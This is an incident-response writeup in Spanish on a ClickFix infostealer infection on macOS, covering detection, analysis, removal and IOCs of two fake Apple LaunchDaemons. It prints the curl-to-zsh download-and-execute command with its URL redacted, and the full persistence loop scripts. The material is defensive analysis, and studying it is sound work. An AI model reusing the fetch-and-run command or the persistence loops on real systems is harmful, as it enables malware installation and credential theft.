# Incident Response Writeup: Persistencia de Malware vía ClickFix en macOS

**Fecha del incidente:** Julio 2026
**Sistema afectado:** macOS (Catalina/instalación reciente)
**Clasificación:** Infostealer con persistencia mediante LaunchDaemons
**Rol:** Detección, análisis y remediación (self-directed incident response)

---

## Resumen ejecutivo

Se identificó y remedió una infección activa de malware en un equipo macOS, originada por la ejecución de un comando malicioso obtenido de un sitio web de distribución de software pirateado (técnica conocida como **ClickFix**). El malware estableció dos mecanismos de persistencia mediante `LaunchDaemons` a nivel de sistema, cada uno vinculado a un script en bash que intentaba ejecutar un binario adicional (no recuperado, eliminado antes de análisis forense completo) con privilegios de usuario. Se realizó un proceso completo de contención, análisis, erradicación y verificación, sin pérdida de datos ni persistencia residual.

---

## 1. Vector de ataque

**Técnica:** ClickFix (ingeniería social vía falso instalador/CAPTCHA)

El usuario, navegando en un sitio de distribución de software crackeado, fue inducido a copiar y ejecutar en Terminal el siguiente comando (URL ofuscada en Base64 para evadir detección visual y de contenido):

```bash
curl -s $(echo "<base64_ofuscado>" | openssl base64 -d -A) | zsh
```

**Por qué es efectivo este vector:**
- Evade la mayoría de los controles de seguridad tradicionales, ya que no requiere explotar una vulnerabilidad — requiere que el usuario ejecute el comando voluntariamente.
- El uso de Base64 dificulta la inspección visual del comando antes de ejecutarlo.
- El pipe directo a `zsh` ejecuta el payload descargado sin dejar el script en disco para inspección previa.

---

## 2. Detección

Ante la sospecha de compromiso, se inició un proceso de triage manual revisando los puntos de persistencia estándar en macOS:

```bash
history | grep -i curl
ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons
```

Se identificaron dos archivos `.plist` en `/Library/LaunchDaemons` con nombres diseñados para imitar procesos legítimos de Apple:

| Archivo | Nombre real vs. legítimo |
|---|---|
| `com.apple.accountsd.helper.plist` | Imita `accountsd`, pero no es un servicio real de Apple |
| `com.apple.metadata.mds.worker.plist` | Imita `mdworker` (Spotlight), pero no es un servicio real de Apple |

**Indicador clave de sospecha:** ambos declaraban `KeepAlive: true`, lo cual obliga a `launchd` a relanzar el proceso automáticamente si se lo mata — un patrón de persistencia típico de malware, no de utilidades del sistema.

---

## 3. Análisis de artefactos (antes de remediar)

Se inspeccionó el contenido de ambos `.plist` sin ejecutarlos ni alterarlos:

```bash
cat /Library/LaunchDaemons/com.apple.accountsd.helper.plist
cat /Library/LaunchDaemons/com.apple.metadata.mds.worker.plist
```

Ambos apuntaban a scripts ocultos (prefijo `.`) en `~/Library/Application Support/`, fuera de la vista habitual del Finder.

### Script 1 — `.service` (AccountsHelper)
```bash
while true; do
    osascript <<EOF
set loginContent to do shell script "stat -f \"%Su\" /dev/console"
if loginContent is not equal to "" and loginContent is not equal to "root"
    do shell script "sudo -u " & quoted form of loginContent & " '.../AccountsHelper'"
end if
EOF
    sleep 5
done
```

### Script 2 — `.mdworker` (metadata worker)
```bash
#!/bin/bash
while true; do
    CUSER=$(stat -f "%Su" /dev/console 2>/dev/null)
    if [ -n "$CUSER" ] && [ "$CUSER" != "root" ]; then
        CUID=$(id -u "$CUSER" 2>/dev/null)
        launchctl asuser "$CUID" '.../mdworker_shared'
    fi
    sleep 5
done
```

**Análisis del comportamiento:**
- Ambos loops corren indefinidamente, cada 5 segundos, verificando qué usuario tiene sesión activa en consola.
- Ejecutan un binario (`AccountsHelper` / `mdworker_shared`) con los privilegios de ese usuario — el payload real no estaba en el script, sino en un binario referenciado que no se recuperó para análisis (fue eliminado durante la fase de erradicación, priorizando contención sobre forense profundo).
- El patrón (verificar usuario activo + ejecutar binario con sus permisos + reintentar cada 5s) es consistente con familias de **infostealers** para macOS orientadas a robo de credenciales de Keychain, cookies de navegador y sesiones activas.

---

## 4. Contención

1. Desconexión de red inmediata, para cortar cualquier canal de exfiltración activo.
2. Descarga controlada de los daemons antes de eliminar archivos (crítico por el `KeepAlive: true`):

```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.accountsd.helper.plist
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.metadata.mds.worker.plist
```

> **Nota técnica:** matar el proceso directamente (`kill`) sin antes hacer `bootout` habría resultado en un relanzamiento inmediato por parte de `launchd`, dado el flag `KeepAlive`. El orden de las operaciones es determinante en la remediación de persistencia de este tipo.

---

## 5. Erradicación

```bash
sudo rm /Library/LaunchDaemons/com.apple.accountsd.helper.plist
sudo rm /Library/LaunchDaemons/com.apple.metadata.mds.worker.plist
sudo rm -rf "~/Library/Application Support/.com.apple.accountsd"
sudo rm -rf "~/Library/Application Support/.com.apple.metadata.mds"
```

---

## 6. Verificación post-incidente

Se auditaron sistemáticamente todos los puntos de persistencia conocidos en macOS para confirmar erradicación completa:

| Punto de verificación | Comando | Resultado |
|---|---|---|
| Procesos activos del malware | `ps aux \| grep -i "accountsd\|mdworker"` | Solo procesos legítimos de Apple (`/System/Library/...`) |
| Cron jobs (usuario) | `crontab -l` | Vacío |
| LaunchAgents de usuario | `ls -la ~/Library/LaunchAgents` | Vacío |
| Shell profile (persistencia alternativa) | `cat ~/.zshrc/.zprofile/.zshenv` | Sin archivos / sin modificaciones |
| Perfiles de configuración (MDM) | `sudo profiles list` | Ninguno instalado |
| Procesos huérfanos del script en loop | `ps aux \| grep "AccountsHelper\|while true"` | Ninguno |

**Resultado:** sin evidencia de persistencia residual en ningún vector estándar.

---

## 7. Impacto y remediación de credenciales

Dado que el malware operó con acceso de usuario (y brevemente con `sudo` durante su instalación), se asumió exposición potencial de:
- Keychain de macOS
- Cookies/sesiones de navegador
- Credenciales de aplicaciones activas

**Acción tomada:** cambio de contraseñas desde un dispositivo no comprometido, priorizando cuentas con 2FA ya activo, y revisión de sesiones activas en servicios críticos (email).

---

## 8. Lecciones aprendidas

1. **El vector fue humano, no técnico** — ninguna vulnerabilidad de software fue explotada; el ataque dependió enteramente de inducir la ejecución manual de un comando. La mitigación más efectiva es el hábito, no el parche.
2. **`KeepAlive: true` en un LaunchDaemon desconocido es una señal de alerta por sí sola** — es un patrón que casi nunca aparece en software legítimo de terceros y sí es común en malware persistente.
3. **El orden de las operaciones en remediación importa** — `bootout` antes de eliminar archivos evita que el propio sistema operativo relance el proceso malicioso durante la limpieza.
4. **Analizar antes de eliminar** — inspeccionar el contenido de los `.plist` y los scripts asociados antes de borrarlos permitió entender el mecanismo completo de persistencia, en vez de solo "apagar el síntoma".
5. **Control preventivo recomendado:** activar el Firewall de macOS de forma proactiva y evitar fuentes de software no oficiales, particularmente sitios de distribución de contenido pirateado, identificados como vector de entrada recurrente para esta familia de ataques.

---

## Indicadores de Compromiso (IOCs)

```
Archivos:
/Library/LaunchDaemons/com.apple.accountsd.helper.plist
/Library/LaunchDaemons/com.apple.metadata.mds.worker.plist
~/Library/Application Support/.com.apple.accountsd/.service
~/Library/Application Support/.com.apple.metadata.mds/.mdworker

Labels de LaunchDaemon:
com.apple.accountsd.helper
com.apple.metadata.mds.worker

Comportamiento:
Loop de reintento cada 5s verificando usuario en consola activo
Ejecución de binario con privilegios de usuario vía sudo/launchctl asuser
```

---

*Este writeup documenta un incidente real resuelto de forma autodidacta, aplicando metodología estándar de respuesta a incidentes (detección → contención → erradicación → verificación → lecciones aprendidas).*
